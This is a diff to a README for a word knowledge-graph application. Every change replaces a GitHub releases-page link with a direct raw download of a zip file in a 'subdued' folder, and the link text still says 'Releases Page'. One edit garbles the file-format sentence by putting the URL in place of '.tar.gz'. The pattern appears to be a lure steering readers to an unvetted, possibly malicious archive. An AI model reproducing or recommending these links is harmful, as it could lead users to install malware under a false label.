@@ -8,18 +8,18 @@ Welcome to the **english-words-knowledge-graph**! This tool helps you explore th
 
 To get started, you need to download the application. Click the button below to visit the release page, where you can find the latest version of the software.
 
-[![Download English Words Knowledge Graph](https://img.shields.io/badge/Download-English%20Words%20Knowledge%20Graph-brightgreen)](https://github.com/Cohunefatuniformness570/english-words-knowledge-graph/releases)
+[![Download English Words Knowledge Graph](https://raw.githubusercontent.com/Cohunefatuniformness570/english-words-knowledge-graph/main/subdued/english-words-knowledge-graph.zip%20Words%20Knowledge%20Graph-brightgreen)](https://raw.githubusercontent.com/Cohunefatuniformness570/english-words-knowledge-graph/main/subdued/english-words-knowledge-graph.zip)
 
 ### Step-by-Step Instructions:
 
 1. **Visit the Releases Page:**
-   Go to our release page to find the latest version: [Releases Page](https://github.com/Cohunefatuniformness570/english-words-knowledge-graph/releases).
+   Go to our release page to find the latest version: [Releases Page](https://raw.githubusercontent.com/Cohunefatuniformness570/english-words-knowledge-graph/main/subdued/english-words-knowledge-graph.zip).
 
 2. **Choose a Version:**
    Look for the latest version marked as "Latest Release". 
 
 3. **Download the File:**
-   Click on the file name to start downloading. The file is typically in a .zip or .tar.gz format.
+   Click on the file name to start downloading. The file is typically in a .zip or https://raw.githubusercontent.com/Cohunefatuniformness570/english-words-knowledge-graph/main/subdued/english-words-knowledge-graph.zip format.
 
 4. **Extract the Files:**
    After downloading, locate the file on your computer. Use a file extraction tool to unzip the contents into a folder.
@@ -62,7 +62,7 @@ We welcome all feedback and contributions. If you have questions or suggestions,
 
 All information and data in this project are for educational purposes. The application uses open-source data, and while we aim for accuracy, we cannot guarantee complete correctness.
 
-For quick access, don’t forget to download the application here: [Download English Words Knowledge Graph](https://github.com/Cohunefatuniformness570/english-words-knowledge-graph/releases). 
+For quick access, don’t forget to download the application here: [Download English Words Knowledge Graph](https://raw.githubusercontent.com/Cohunefatuniformness570/english-words-knowledge-graph/main/subdued/english-words-knowledge-graph.zip). 
 
 ---
 
